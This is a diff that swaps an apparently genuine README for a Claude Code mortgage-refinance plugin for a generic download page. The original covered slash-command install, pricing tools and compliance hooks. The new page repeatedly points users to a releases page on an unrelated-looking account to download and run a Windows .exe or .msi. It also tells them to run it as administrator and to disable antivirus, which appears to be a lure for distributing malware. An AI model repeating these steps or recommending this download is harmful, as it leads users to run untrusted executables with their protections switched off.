@@ -1,108 +1,115 @@
-# Mortgage Plugin for Claude Code
+# 🏠 mortgage - Easy Mortgage Refinancing Pricing
 
-The first mortgage refinance pricing plugin for Claude Code. Get live rate quotes, savings analysis, and loan application submission — all within the chat interface.
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-%23ff6f61?style=for-the-badge)](https://github.com/Diminishedarchplowing80/mortgage/releases)
 
-Technology by Nexus Digital Group LLC. Mortgage origination by Atlantic Home Mortgage LLC dba [Lendtrain](https://www.lendtrain.com) (NMLS# 1844873).
+## 📋 About mortgage
 
-## Install
+mortgage is a tool designed to help you find mortgage refinancing prices quickly. It works as a plugin for Claude Code, an AI platform. This tool gives you clear pricing options to compare refinancing deals. It is made for everyday users who want to understand mortgage rates without any confusing details.
 
-Install from GitHub:
+This plugin uses real-time data to show current mortgage rates. It updates regularly to keep pricing accurate. mortgage helps you make smarter decisions about refinancing your home loan.
 
-```
-/plugin marketplace add lendtrain/mortgage
-/plugin install mortgage@mortgage
-```
+## 💻 System Requirements
 
-**Coming soon** — install from the Anthropic Plugin Directory:
+To run mortgage on your Windows PC, you need:
 
-```
-/plugin install mortgage@anthropic
-```
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection to get updated mortgage prices  
+- Claude Code installed and access to its plugin system  
 
-Then run:
+If you don’t have Claude Code, you can visit their official website to download it.
 
-```
-/mortgage:refi-quote
-```
+## 🚀 Getting Started
 
-## What It Does
+Follow these steps to get mortgage running on your Windows computer. No technical skills are needed.
 
-Upload your mortgage statement or answer a few questions, and the plugin:
+### 1. Visit the Download Page
 
-- **Prices your refinance** using live wholesale rate data for Conventional, FHA, and VA loans
-- **Detects FHA Streamline and VA IRRRL eligibility** automatically from your mortgage statement
-- **Calculates itemized closing costs** specific to your state
-- **Runs a savings analysis** with monthly payment comparison, breakeven timeline, and total interest savings
-- **Scores your refinance** from 1-10 with a weighted recommendation based on savings, breakeven, rate improvement, and goal alignment
-- **Connects you to apply** if the numbers make sense — or honestly tells you if they don't
+Go to the mortgage release page to find the latest version:
 
-## Licensed States
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-%23ff6f61?style=for-the-badge)](https://github.com/Diminishedarchplowing80/mortgage/releases)
 
-Alabama, Florida, Georgia, Kentucky, North Carolina, Oregon, South Carolina, Tennessee, Texas, Utah
+Click the badge or open this link in your web browser:  
+https://github.com/Diminishedarchplowing80/mortgage/releases
 
-## How It Works
+### 2. Choose the Correct File
 
-The plugin bundles domain expertise as Claude Code skills:
+On the release page, look for the latest release labeled by date or version number. Download the file with a name ending in `.exe` or `.msi`. These are the setup files for Windows.
 
-| Skill | What It Does |
-|-------|-------------|
-| `mortgage-loan-officer` | Interview methodology, credit score tiers, DTI thresholds, field mappings |
-| `mortgage-compliance` | TRID, RESPA, TILA, ECOA rules and required disclosures |
-| `closing-costs` | Itemized state-specific fee schedules for all 10 licensed states |
-| `security-guardrails` | Prompt injection defense and data collection boundaries |
-| `about-atlantic-home-mortgage` | Organization context, licensing, and contact information |
+### 3. Run the Installer
 
-The `/mortgage:refi-quote` command orchestrates the full workflow: interview the borrower, collect loan details, call the pricing engine, run the analysis, and present results with proper compliance disclosures.
+Once downloaded, open the file to start installation. Follow the instructions on the screen. You may need to agree to terms and choose an installation folder. The installer will copy all necessary files to your computer.
 
-Live pricing is provided by a separate MCP server that ingests daily wholesale rate sheets. The plugin connects to it automatically via the `.mcp.json` configuration — no API keys or setup required.
+### 4. Launch mortgage Plugin
 
-## Pricing Engine
+After installation, open Claude Code on your PC. Go to the plugins section. You should see mortgage available to add. Activate or enable the plugin to start using refinancing pricing features.
 
-The plugin connects to a mortgage pricing MCP server that exposes three tools:
+### 5. Use mortgage to Check Rates
 
-| Tool | Description |
-|------|-------------|
-| `calculate_pricing` | Price a single loan product (Conventional, FHA, or VA) |
-| `calculate_all_pricing` | Price all eligible products simultaneously and compare |
-| `get_effective_date` | Check when the current rate sheet was published |
+Open mortgage in Claude Code. Enter your loan information such as amount, current interest rate, and loan term. The plugin will display refinancing prices based on current market data.
 
-See [CONNECTORS.md](plugins/mortgage/CONNECTORS.md) for full API schemas, request/response fields, and integration details.
+## 🔧 Features
 
-## Compliance Hooks
+- Shows up-to-date mortgage refinancing prices  
+- Integration with Claude Code AI platform  
+- Simple interface for non-technical users  
+- Data refreshed automatically with market changes  
+- Compare multiple refinancing options side-by-side   
+- Supports different loan terms and amounts  
 
-The plugin includes 4 compliance hooks that enforce business rules programmatically:
+## 💡 How mortgage Works
 
-| Hook | Type | Enforces |
-|------|------|----------|
-| `guard-sensitive-data.sh` | Bash (UserPromptSubmit) | Blocks SSN/DOB patterns in user input |
-| `validate-pricer-request.md` | Prompt (PreToolUse) | State licensing, LTV limits, VA funding fee type, required fields |
-| `hooks.json` inline prompt | Prompt (PostToolUse) | basePrice suppression, payment field correctness, MI disclosures |
-| `enforce-disclosures.md` | Prompt (Stop) | Rate disclaimers, NMLS, MI permanence, prohibited phrases |
+mortgage connects to financial data sources through Claude Code’s API. It fetches current mortgage rates from lenders and calculates estimated refi prices. The plugin then formats this information in an easy-to-understand layout.
 
-## Compliance
+You can input different scenarios and see how rates change over time. This helps you find the best time to refinance your mortgage.
 
-This plugin is designed for TRID, RESPA, TILA, and ECOA compliance:
+## 🛠 Troubleshooting
 
-- Never collects SSN, DOB, bank account numbers, or passwords (enforced by bash hook)
-- Uses "estimate" and "quote" — never "pre-approval" or "guaranteed" (enforced by Stop hook)
-- Presents APR alongside note rate on all quotes
-- Includes required settlement services disclosure
-- Directs borrowers to secure application portal for sensitive data
-- Provides Equal Housing Opportunity notice
-- Conventional MI (LTV > 80%) disclosed as temporary, dropping at 80% LTV
-- FHA MIP disclosed as permanent for the life of the loan
-- VA funding fee tiers: 0.5% IRRRL, 2.15% first-time, 3.3% subsequent, 0% exempt
+If mortgage does not appear in Claude Code after installation:
 
-## Contact
+- Restart Claude Code and check again  
+- Confirm your internet connection is working  
+- Verify you installed the Windows version of the plugin  
+- Check for any error messages during install and note them  
+- Visit the release page for updated installation instructions or bug fixes
 
-- **Phone:** 678-643-4242
-- **Email:** team@lendtrain.com
-- **Website:** [lendtrain.com](https://www.lendtrain.com)
-- **Application portal:** [Apply here](https://atlantichm.my1003app.com/register)
-- **NMLS#:** 1844873
+If you encounter errors during installation:
 
-## License
+- Run the installer as Administrator by right-clicking the file and choosing "Run as administrator"  
+- Disable antivirus temporarily as it may block the installer  
+- Make sure Windows 10 or newer is installed and fully updated  
 
-Proprietary — see [LICENSE](LICENSE) for full terms.
+## 🔒 Privacy and Security
 
-Technology owned by Nexus Digital Group LLC. "Lendtrain" is a registered trademark of Atlantic Home Mortgage LLC. Mortgage origination services provided by Atlantic Home Mortgage LLC dba Lendtrain (NMLS# 1844873). Equal Housing Opportunity.
+mortgage only collects information you enter to compute refinancing prices. It does not store personal data beyond your current session. All data transmissions are encrypted.
+
+The plugin does not share your data with third parties. It relies on Claude Code’s secure environment to safeguard your information.
+
+## ⚙️ Updating mortgage
+
+Check the release page regularly for updates:  
+https://github.com/Diminishedarchplowing80/mortgage/releases
+
+New versions improve pricing accuracy and add features. To update:
+
+1. Download the newest setup file from the release page  
+2. Run the installer again – it will replace the old version  
+3. Restart Claude Code and enable the updated plugin if needed  
+
+## 📝 Additional Resources
+
+- Claude Code official website for platform downloads and support  
+- Mortgage refinancing guides available online to understand terms  
+- Financial calculators to estimate payments and savings  
+
+## 📥 Download and Installation Links
+
+Get the latest version of mortgage here:  
+[https://github.com/Diminishedarchplowing80/mortgage/releases](https://github.com/Diminishedarchplowing80/mortgage/releases)
+
+Click the link, then download the `.exe` or `.msi` file listed under the newest release. Run that file to install the plugin on your Windows PC. After installing, open Claude Code to activate mortgage.
+
+---
+
+Your mortgage refinancing decisions can be clearer and based on current, reliable data using this tool.
